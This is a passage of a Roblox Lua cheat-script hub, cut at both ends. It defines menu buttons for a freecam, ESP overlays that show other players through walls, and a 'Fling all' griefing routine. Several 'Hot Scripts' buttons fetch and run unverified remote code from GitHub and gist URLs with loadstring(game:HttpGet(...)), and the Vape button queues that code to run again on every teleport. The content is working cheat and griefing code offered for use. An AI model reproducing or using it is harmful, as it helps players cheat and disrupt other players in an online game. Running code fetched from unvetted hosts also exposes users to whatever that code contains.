mouse.Delta = Vector2.new(-delta.y, -delta.x)
return Enum.ContextActionResult.Sink
end

local function Thumb(action, state, input)
gamepad[input.KeyCode.Name] = input.Position
return Enum.ContextActionResult.Sink
end

local function Trigger(action, state, input)
gamepad[input.KeyCode.Name] = input.Position.z
return Enum.ContextActionResult.Sink
end

local function MouseWheel(action, state, input)
mouse[input.UserInputType.Name] = -input.Position.z
return Enum.ContextActionResult.Sink
end

local function Zero(t)
for k, v in pairs(t) do
t[k] = v*0
end
end

function Input.StartCapture()
ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
Enum.KeyCode.W, Enum.KeyCode.U,
Enum.KeyCode.A, Enum.KeyCode.H,
Enum.KeyCode.S, Enum.KeyCode.J,
Enum.KeyCode.D, Enum.KeyCode.K,
Enum.KeyCode.E, Enum.KeyCode.I,
Enum.KeyCode.Q, Enum.KeyCode.Y,
Enum.KeyCode.Up, Enum.KeyCode.Down
)
ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
end

function Input.StopCapture()
navSpeed = 1
Zero(gamepad)
Zero(keyboard)
Zero(mouse)
ContextActionService:UnbindAction("FreecamKeyboard")
ContextActionService:UnbindAction("FreecamMousePan")
ContextActionService:UnbindAction("FreecamMouseWheel")
ContextActionService:UnbindAction("FreecamGamepadButton")
ContextActionService:UnbindAction("FreecamGamepadTrigger")
ContextActionService:UnbindAction("FreecamGamepadThumbstick")
end
end
end

local function GetFocusDistance(cameraFrame)
local znear = 0.1
local viewport = Camera.ViewportSize
local projy = 2*tan(cameraFov/2)
local projx = viewport.x/viewport.y*projy
local fx = cameraFrame.rightVector
local fy = cameraFrame.upVector
local fz = cameraFrame.lookVector

local minVect = Vector3.new()
local minDist = 512

for x = 0, 1, 0.5 do
for y = 0, 1, 0.5 do
local cx = (x - 0.5)*projx
local cy = (y - 0.5)*projy
local offset = fx*cx - fy*cy + fz
local origin = cameraFrame.p + offset*znear
local part, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
local dist = (hit - origin).magnitude
if minDist > dist then
minDist = dist
minVect = offset.unit
end
end
end

return fz:Dot(minVect)*minDist
end

------------------------------------------------------------------------

local function StepFreecam(dt)
local vel = velSpring:Update(dt, Input.Vel(dt))
local pan = panSpring:Update(dt, Input.Pan(dt))
local fov = fovSpring:Update(dt, Input.Fov(dt))

local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
cameraPos = cameraCFrame.p

Camera.CFrame = cameraCFrame
Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
Camera.FieldOfView = cameraFov
end

------------------------------------------------------------------------

local PlayerState = {} do
local mouseIconEnabled
local cameraSubject
local cameraType
local cameraFocus
local cameraCFrame
local cameraFieldOfView
local screenGuis = {}
local coreGuis = {
Backpack = true,
Chat = true,
Health = true,
PlayerList = true,
}
local setCores = {
BadgesNotificationsActive = true,
PointsNotificationsActive = true,
}

-- Save state and set up for freecam
function PlayerState.Push()
for name in pairs(coreGuis) do
coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
end
for name in pairs(setCores) do
setCores[name] = StarterGui:GetCore(name)
StarterGui:SetCore(name, false)
end
local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
if playergui then
for _, gui in pairs(playergui:GetChildren()) do
if gui:IsA("ScreenGui") and gui.Enabled then
screenGuis[#screenGuis + 1] = gui
gui.Enabled = false
end
end
end

cameraFieldOfView = Camera.FieldOfView
Camera.FieldOfView = 70

cameraType = Camera.CameraType
Camera.CameraType = Enum.CameraType.Custom

cameraSubject = Camera.CameraSubject
Camera.CameraSubject = nil

cameraCFrame = Camera.CFrame
cameraFocus = Camera.Focus

mouseIconEnabled = UserInputService.MouseIconEnabled
UserInputService.MouseIconEnabled = false

mouseBehavior = UserInputService.MouseBehavior
UserInputService.MouseBehavior = Enum.MouseBehavior.Default
end

-- Restore state
function PlayerState.Pop()
for name, isEnabled in pairs(coreGuis) do
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
end
for name, isEnabled in pairs(setCores) do
StarterGui:SetCore(name, isEnabled)
end
for _, gui in pairs(screenGuis) do
if gui.Parent then
gui.Enabled = true
end
end

Camera.FieldOfView = cameraFieldOfView
cameraFieldOfView = nil

Camera.CameraType = cameraType
cameraType = nil

Camera.CameraSubject = cameraSubject
cameraSubject = nil

Camera.CFrame = cameraCFrame
cameraCFrame = nil

Camera.Focus = cameraFocus
cameraFocus = nil

UserInputService.MouseIconEnabled = mouseIconEnabled
mouseIconEnabled = nil

UserInputService.MouseBehavior = mouseBehavior
mouseBehavior = nil
end
end

local function StartFreecam()
local cameraCFrame = Camera.CFrame
cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
cameraPos = cameraCFrame.p
cameraFov = Camera.FieldOfView

velSpring:Reset(Vector3.new())
panSpring:Reset(Vector2.new())
fovSpring:Reset(0)

PlayerState.Push()
RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
Input.StartCapture()
end

local function StopFreecam()
Input.StopCapture()
RunService:UnbindFromRenderStep("Freecam")
PlayerState.Pop()
end

------------------------------------------------------------------------

do
local enabled = false

local function ToggleFreecam()
if enabled then
StopFreecam()
else
StartFreecam()
end
enabled = not enabled
end

local function CheckMacro(macro)
for i = 1, #macro - 1 do
if not UserInputService:IsKeyDown(macro[i]) then
return
end
end
ToggleFreecam()
end

local function HandleActivationInput(action, state, input)
if state == Enum.UserInputState.Begin then
if input.KeyCode == FREECAM_MACRO_KB[#FREECAM_MACRO_KB] then
CheckMacro(FREECAM_MACRO_KB)
end
end
return Enum.ContextActionResult.Pass
end

ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB[#FREECAM_MACRO_KB])
end
end))
for i,v in pairs(mas:GetChildren()) do
v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
spawn(function()
pcall(v)
end)
end
end)

Section:NewButton("Universal ESP", "ESP", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
end)

Section:NewButton("Esp default (M)", "esp", function()
wait()
while wait(0.5) do
    for i, childrik in ipairs(workspace:GetDescendants()) do
        if childrik:FindFirstChild("Humanoid") then
            if not childrik:FindFirstChild("EspBox") then
                if childrik ~= game.Players.LocalPlayer.Character then
                    local esp = Instance.new("BoxHandleAdornment",childrik)
                    esp.Adornee = childrik
                    esp.ZIndex = 0
                    esp.Size = Vector3.new(4, 5, 1)
                    esp.Transparency = 0.65
                    esp.Color3 = Color3.fromRGB(255,48,48)
                    esp.AlwaysOnTop = true
                    esp.Name = "EspBox"
                end
            end
        end
    end
end
end)
 
Section:NewButton("ESP GUI", "PRESS F4", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/espice", true))()
end)
 
Section:NewButton("ESP CREATE", "ESP", function()
wait()
--by danielgamer9799 - on ScriptBlox.com
local ESPGUI = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TItle = Instance.new("TextLabel")
local CreateESP = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local RemoveESP = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local CustomizeESP = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local TItle_2 = Instance.new("TextLabel")
local FillColor = Instance.new("TextLabel")
local OutlineColor = Instance.new("TextLabel")
local FILL_R = Instance.new("TextBox")
local UICorner_5 = Instance.new("UICorner")
local FILL_G = Instance.new("TextBox")
local UICorner_6 = Instance.new("UICorner")
local FILL_B = Instance.new("TextBox")
local UICorner_7 = Instance.new("UICorner")
local OUT_B = Instance.new("TextBox")
local UICorner_8 = Instance.new("UICorner")
local OUT_R = Instance.new("TextBox")
local UICorner_9 = Instance.new("UICorner")
local OUT_G = Instance.new("TextBox")
local UICorner_10 = Instance.new("UICorner")
local FILL_PREVIEW = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local out_PREVIEW = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local RunService = game:GetService("RunService")
--Properties:
 
ESPGUI.Name = "ESPGUI"
ESPGUI.Parent = game.CoreGui
ESPGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ESPGUI.ResetOnSpawn = false
ESPGUI.IgnoreGuiInset = true
 
MainFrame.Name = "MainFrame"
MainFrame.Parent = ESPGUI
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(0.365747452, 0, 0.03125, 0)
MainFrame.Size = UDim2.new(0, 187, 0, 103)
MainFrame.Active = true
MainFrame.Draggable = true
 
UICorner.Parent = MainFrame
 
UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(51, 143, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(14, 90, 255))}
UIGradient.Parent = MainFrame
 
TItle.Name = "TItle"
TItle.Parent = MainFrame
TItle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TItle.BackgroundTransparency = 1.000
TItle.Size = UDim2.new(0, 187, 0, 32)
TItle.Font = Enum.Font.GothamBlack
TItle.Text = "ESP GUI"
TItle.TextColor3 = Color3.fromRGB(255, 255, 255)
TItle.TextSize = 14.000
 
CreateESP.Name = "CreateESP"
CreateESP.Parent = MainFrame
CreateESP.BackgroundColor3 = Color3.fromRGB(90, 255, 19)
CreateESP.Position = UDim2.new(0.155080214, 0, 0.242718458, 0)
CreateESP.Size = UDim2.new(0, 128, 0, 23)
CreateESP.Font = Enum.Font.GothamBlack
CreateESP.Text = "Create ESP"
CreateESP.TextColor3 = Color3.fromRGB(255, 255, 255)
CreateESP.TextSize = 14.000
 
UICorner_2.Parent = CreateESP
 
RemoveESP.Name = "RemoveESP"
RemoveESP.Parent = MainFrame
RemoveESP.BackgroundColor3 = Color3.fromRGB(255, 92, 11)
RemoveESP.Position = UDim2.new(0.155080214, 0, 0.524271846, 0)
RemoveESP.Size = UDim2.new(0, 128, 0, 23)
RemoveESP.Font = Enum.Font.GothamBlack
RemoveESP.Text = "Remove ESP"
RemoveESP.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoveESP.TextSize = 14.000
 
UICorner_3.Parent = RemoveESP
 
CustomizeESP.Name = "CustomizeESP"
CustomizeESP.Parent = ESPGUI
CustomizeESP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CustomizeESP.Position = UDim2.new(0.517416537, 0, 0.03125, 0)
CustomizeESP.Size = UDim2.new(0, 426, 0, 84)
CustomizeESP.Active = true
CustomizeESP.Draggable = true
 
UICorner_4.Parent = CustomizeESP
 
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(51, 143, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(14, 90, 255))}
UIGradient_2.Parent = CustomizeESP
 
TItle_2.Name = "TItle"
TItle_2.Parent = CustomizeESP
TItle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TItle_2.BackgroundTransparency = 1.000
TItle_2.Size = UDim2.new(0, 321, 0, 32)
TItle_2.Font = Enum.Font.GothamBlack
TItle_2.Text = "Customize ESP"
TItle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TItle_2.TextSize = 14.000
 
FillColor.Name = "FillColor"
FillColor.Parent = CustomizeESP
FillColor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FillColor.BackgroundTransparency = 1.000
FillColor.Position = UDim2.new(0, 0, 0.195121944, 0)
FillColor.Size = UDim2.new(0, 81, 0, 32)
FillColor.Font = Enum.Font.GothamBlack
FillColor.Text = "Fill Color"
FillColor.TextColor3 = Color3.fromRGB(255, 255, 255)
FillColor.TextSize = 14.000
 
OutlineColor.Name = "OutlineColor"
OutlineColor.Parent = CustomizeESP
OutlineColor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OutlineColor.BackgroundTransparency = 1.000
OutlineColor.Position = UDim2.new(0.0267573483, 0, 0.589157462, 0)
OutlineColor.Size = UDim2.new(0, 81, 0, 32)
OutlineColor.Font = Enum.Font.GothamBlack
OutlineColor.Text = "Outline Color"
OutlineColor.TextColor3 = Color3.fromRGB(255, 255, 255)
OutlineColor.TextSize = 14.000
 
FILL_R.Name = "FILL_R"
FILL_R.Parent = CustomizeESP
FILL_R.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FILL_R.Position = UDim2.new(0.252336442, 0, 0.333333343, 0)
FILL_R.Size = UDim2.new(0, 79, 0, 16)
FILL_R.Font = Enum.Font.GothamBlack
FILL_R.PlaceholderText = "R"
FILL_R.Text = ""
FILL_R.TextColor3 = Color3.fromRGB(255, 255, 255)
FILL_R.TextSize = 14.000
 
UICorner_5.Parent = FILL_R
 
FILL_G.Name = "FILL_G"
FILL_G.Parent = CustomizeESP
FILL_G.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FILL_G.Position = UDim2.new(0.467428356, 0, 0.333333343, 0)
FILL_G.Size = UDim2.new(0, 79, 0, 16)
FILL_G.Font = Enum.Font.GothamBlack
FILL_G.PlaceholderText = "G"
FILL_G.Text = ""
FILL_G.TextColor3 = Color3.fromRGB(255, 255, 255)
FILL_G.TextSize = 14.000
 
UICorner_6.Parent = FILL_G
 
FILL_B.Name = "FILL_B"
FILL_B.Parent = CustomizeESP
FILL_B.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FILL_B.Position = UDim2.new(0.705080032, 0, 0.333333343, 0)
FILL_B.Size = UDim2.new(0, 79, 0, 16)
FILL_B.Font = Enum.Font.GothamBlack
FILL_B.PlaceholderText = "B"
FILL_B.Text = ""
FILL_B.TextColor3 = Color3.fromRGB(255, 255, 255)
FILL_B.TextSize = 14.000
 
UICorner_7.Parent = FILL_B
 
OUT_B.Name = "OUT_B"
OUT_B.Parent = CustomizeESP
OUT_B.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OUT_B.Position = UDim2.new(0.705080032, 0, 0.678571463, 0)
OUT_B.Size = UDim2.new(0, 79, 0, 16)
OUT_B.Font = Enum.Font.GothamBlack
OUT_B.PlaceholderText = "B"
OUT_B.Text = ""
OUT_B.TextColor3 = Color3.fromRGB(255, 255, 255)
OUT_B.TextSize = 14.000
 
UICorner_8.Parent = OUT_B
 
OUT_R.Name = "OUT_R"
OUT_R.Parent = CustomizeESP
OUT_R.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OUT_R.Position = UDim2.new(0.252336442, 0, 0.678571463, 0)
OUT_R.Size = UDim2.new(0, 79, 0, 16)
OUT_R.Font = Enum.Font.GothamBlack
OUT_R.PlaceholderText = "R"
OUT_R.Text = ""
OUT_R.TextColor3 = Color3.fromRGB(255, 255, 255)
OUT_R.TextSize = 14.000
 
UICorner_9.Parent = OUT_R
 
OUT_G.Name = "OUT_G"
OUT_G.Parent = CustomizeESP
OUT_G.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OUT_G.Position = UDim2.new(0.467428356, 0, 0.678571463, 0)
OUT_G.Size = UDim2.new(0, 79, 0, 16)
OUT_G.Font = Enum.Font.GothamBlack
OUT_G.PlaceholderText = "G"
OUT_G.Text = ""
OUT_G.TextColor3 = Color3.fromRGB(255, 255, 255)
OUT_G.TextSize = 14.000
 
UICorner_10.Parent = OUT_G
 
FILL_PREVIEW.Name = "FILL_PREVIEW"
FILL_PREVIEW.Parent = CustomizeESP
FILL_PREVIEW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FILL_PREVIEW.Position = UDim2.new(0.917840362, 0, 0.261904776, 0)
FILL_PREVIEW.Size = UDim2.new(0, 27, 0, 27)
 
UICorner_11.Parent = FILL_PREVIEW
 
out_PREVIEW.Name = "out_PREVIEW"
out_PREVIEW.Parent = CustomizeESP
out_PREVIEW.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
out_PREVIEW.Position = UDim2.new(0.917840362, 0, 0.642857134, 0)
out_PREVIEW.Size = UDim2.new(0, 27, 0, 25)
 
UICorner_12.Parent = out_PREVIEW
 
-- Scripts:
 
local function CSGPST_fake_script() -- CreateESP.LocalScript 
    local script = Instance.new('LocalScript', CreateESP)
 
    script.Parent.MouseButton1Click:Connect(function()
        local players = game.Players:GetPlayers()
        for _, v in pairs(players) do
            local FILL_R = tonumber(script.Parent.Parent.Parent.CustomizeESP.FILL_R.Text)
            local FILL_G = tonumber(script.Parent.Parent.Parent.CustomizeESP.FILL_G.Text)
            local FILL_B = tonumber(script.Parent.Parent.Parent.CustomizeESP.FILL_B.Text)
            local OUT_R = tonumber(script.Parent.Parent.Parent.CustomizeESP.OUT_R.Text)
            local OUT_G = tonumber(script.Parent.Parent.Parent.CustomizeESP.OUT_G.Text)
            local OUT_B = tonumber(script.Parent.Parent.Parent.CustomizeESP.OUT_B.Text) 
            local esp = Instance.new("Highlight")
            esp.Name = v.Name
            esp.FillTransparency = 0.3
            esp.FillColor = Color3.fromRGB(FILL_R, FILL_G, FILL_B)
            esp.OutlineColor = Color3.fromRGB(OUT_R, OUT_G, OUT_B)
            esp.OutlineTransparency = 0
            esp.Parent = v.Character
        end
    end)
end
coroutine.wrap(CSGPST_fake_script)()
local function BELCX_fake_script() -- RemoveESP.LocalScript 
    local script = Instance.new('LocalScript', RemoveESP)
 
    script.Parent.MouseButton1Click:Connect(function()
        local players = game.Players:GetPlayers()
        for _, v in pairs(players) do
            local esp = v.Character:FindFirstChild(v.Name)
            if esp then
                esp:Destroy()
            else
                warn("No ESP Found - Couldn't find Any ESP In the Character!")
            end
        end
    end)
end
coroutine.wrap(BELCX_fake_script)()
local function PBDY_fake_script() -- FILL_PREVIEW.LocalScript 
    local script = Instance.new('LocalScript', FILL_PREVIEW)
 
    while wait() do
        local FILL_R = tonumber(script.Parent.Parent.FILL_R.Text)
        local FILL_G = tonumber(script.Parent.Parent.FILL_G.Text)
        local FILL_B = tonumber(script.Parent.Parent.FILL_B.Text)
        local OUT_R = tonumber(script.Parent.Parent.OUT_R.Text)
        local OUT_G = tonumber(script.Parent.Parent.OUT_G.Text)
        local OUT_B = tonumber(script.Parent.Parent.OUT_B.Text) 
 
        script.Parent.BackgroundColor3 = Color3.fromRGB(FILL_R, FILL_G, FILL_B)
 
    end
end
coroutine.wrap(PBDY_fake_script)()
local function JPUFZ_fake_script() -- out_PREVIEW.LocalScript 
    local script = Instance.new('LocalScript', out_PREVIEW)
 
    while wait() do
        local FILL_R = tonumber(script.Parent.Parent.FILL_R.Text)
        local FILL_G = tonumber(script.Parent.Parent.FILL_G.Text)
        local FILL_B = tonumber(script.Parent.Parent.FILL_B.Text)
        local OUT_R = tonumber(script.Parent.Parent.OUT_R.Text)
        local OUT_G = tonumber(script.Parent.Parent.OUT_G.Text)
        local OUT_B = tonumber(script.Parent.Parent.OUT_B.Text) 
 
        script.Parent.BackgroundColor3 = Color3.fromRGB(OUT_R, OUT_G, OUT_B)
 
    end
end
coroutine.wrap(JPUFZ_fake_script)()
 
end)
 
local Tab = Window:NewTab("Hot Scripts")
 
local Section = Tab:NewSection("Hot Scripts by meetly")
 
Section:NewButton("Infiniteyield","hot script", function()
wait()
getgenv().readfile = nil
loadstring(game:HttpGet"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")()
end)

Section:NewButton("KAT","(can crash on a weak computer)", function()
wait()
loadstring(Game:HttpGet("https://gist.githubusercontent.com/qp39rh421984y812/d59f1517d9ed447698dcdbf97bd91b02/raw/360823c8df903d52d2d089a90b3e6106191f8df8/Katmonke"))()
end)

Section:NewButton("Bed Wars (vape 4)", "-", function()
wait()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- credits to 7GrandDadPGN for vape v4.
loadstring(game:HttpGet("https://raw.githubusercontent.com/MuhXd/Roblox-mobile-script/main/FileFixes.lua"))();
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()

task.spawn(function()
    local teleportConnection = game.Players.LocalPlayer.OnTeleport:Connect(function(State)
        if (not teleportedServers) then
    local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
        queueonteleport([[
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            loadstring(game:HttpGet("https://raw.githubusercontent.com/MuhXd/Roblox-mobile-script/main/FileFixes.lua"))();
            loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
        ]])
    end
end)
end)
end)

local Tab = Window:NewTab("links")

local Section = Tab:NewSection("Links")

Section:NewButton("copy link Discord server","-", function()
wait()
setclipboard("https://discord.gg/Hg8BJSMjEZ")
end)
 
local Tab = Window:NewTab("FUN")
 
local Section = Tab:NewSection("FUN SCRIPTS")
 
Section:NewButton("Fling all", "fling all players", function()
wait()
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"

		local Players = game:GetService("Players")
		local Player = Players.LocalPlayer
		
		local AllBool = false
		
		local GetPlayer = function(Name)
			Name = Name:lower()
			if Name == "all" or Name == "others" then
				AllBool = true
				return
			elseif Name == "random" then
				local GetPlayers = Players:GetPlayers()
				if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
				return GetPlayers[math.random(#GetPlayers)]
			elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
				for _,x in next, Players:GetPlayers() do
					if x ~= Player then
						if x.Name:lower():match("^"..Name) then
							return x;
						elseif x.DisplayName:lower():match("^"..Name) then
							return x;
						end
					end
				end
			else
				return
			end
		end
		
		local Message = function(_Title, _Text, Time)
			game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
		end
		
		local SkidFling = function(TargetPlayer)
			local Character = Player.Character
			local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
			local RootPart = Humanoid and Humanoid.RootPart
		
			local TCharacter = TargetPlayer.Character
			local THumanoid
			local TRootPart
			local THead
			local Accessory
			local Handle
		
			if TCharacter:FindFirstChildOfClass("Humanoid") then
				THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
			end
			if THumanoid and THumanoid.RootPart then
				TRootPart = THumanoid.RootPart
			end
			if TCharacter:FindFirstChild("Head") then
				THead = TCharacter.Head
			end
			if TCharacter:FindFirstChildOfClass("Accessory") then
				Accessory = TCharacter:FindFirstChildOfClass("Accessory")
			end
			if Accessoy and Accessory:FindFirstChild("Handle") then
				Handle = Accessory.Handle
			end
		
			if Character and Humanoid and RootPart then
				if RootPart.Velocity.Magnitude < 50 then
					getgenv().OldPos = RootPart.CFrame
				end
				if THumanoid and THumanoid.Sit and not AllBool then
					return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
				end
				if THead then
					workspace.CurrentCamera.CameraSubject = THead
				elseif not THead and Handle then
					workspace.CurrentCamera.CameraSubject = Handle
				elseif THumanoid and TRootPart then
					workspace.CurrentCamera.CameraSubject = THumanoid
				end
				if not TCharacter:FindFirstChildWhichIsA("BasePart") then
					return
				end
				
				local FPos = function(BasePart, Pos, Ang)
					RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
					Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
					RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
					RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
				end
				
				local SFBasePart = function(BasePart)
					local TimeToWait = 2
					local Time = tick()
					local Angle = 0
		
					repeat
						if RootPart and THumanoid then
							if BasePart.Velocity.Magnitude < 50 then
								Angle = Angle + 100
		
								FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
								task.wait()
							else
								FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
								task.wait()
								
								FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
								task.wait()
		
								FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
								task.wait()
							end
						else
							break
						end
					until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
				end
				
				workspace.FallenPartsDestroyHeight = 0/0
				
				local BV = Instance.new("BodyVelocity")
				BV.Name = "EpixVel"
				BV.Parent = RootPart
				BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
				BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
				
				Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
				
				if TRootPart and THead then
					if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
						SFBasePart(THead)
					else
						SFBasePart(TRootPart)
					end
				elseif TRootPart and not THead then
					SFBasePart(TRootPart)
				elseif not TRootPart and THead then
					SFBasePart(THead)
				elseif not TRootPart and not THead and Accessory and Handle then
					SFBasePart(Handle)
				else
					return Message("Error Occurred", "Target is missing everything", 5)
				end
				
				BV:Destroy()
				Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
				workspace.CurrentCamera.CameraSubject = Humanoid
				
				repeat
					RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
					Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
					Humanoid:ChangeState("GettingUp")
					table.foreach(Character:GetChildren(), function(_, x)
						if x:IsA("BasePart") then
							x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
						end
					end)
					task.wait()
				until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
				workspace.FallenPartsDestroyHeight = getgenv().FPDH
			else
				return Message("Error Occurred", "Random error", 5)
			end
		end
		
		if not Welcome then Message("Script by AnthonyIsntHere", "Enjoy!", 5) end
		getgenv().Welcome = true
		if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
		
		if AllBool then
			for _,x in next, Players:GetPlayers() do
				SkidFling(x)
			end
		end
		
		for _,x in next, Targets do
			if GetPlayer(x) and GetPlayer(x) ~= Player then
				if GetPlayer(x).UserId ~= 1414978355 then
